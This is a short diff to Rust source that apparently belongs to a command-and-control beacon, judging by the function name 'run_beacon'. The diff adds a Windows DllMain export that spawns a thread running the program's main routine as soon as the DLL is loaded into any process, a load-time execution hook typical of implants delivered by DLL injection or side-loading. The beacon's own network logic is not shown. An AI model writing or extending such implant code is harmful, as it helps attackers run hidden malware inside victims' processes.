@@ -159,3 +159,14 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
 fn run() {
     std::thread::spawn(|| real_main().unwrap());
 }
+
+#[no_mangle]
+#[cfg(crate_type = "cdylib", target_os = "windows")]
+pub extern "system" fn DllMain(_inst: isize, reason: u32, _: *const u8) -> u32 {
+  if reason == 1 {
+    std::thread::spawn(|| real_main().unwrap());
+    return 0;
+  }
+
+  return 0;
+}
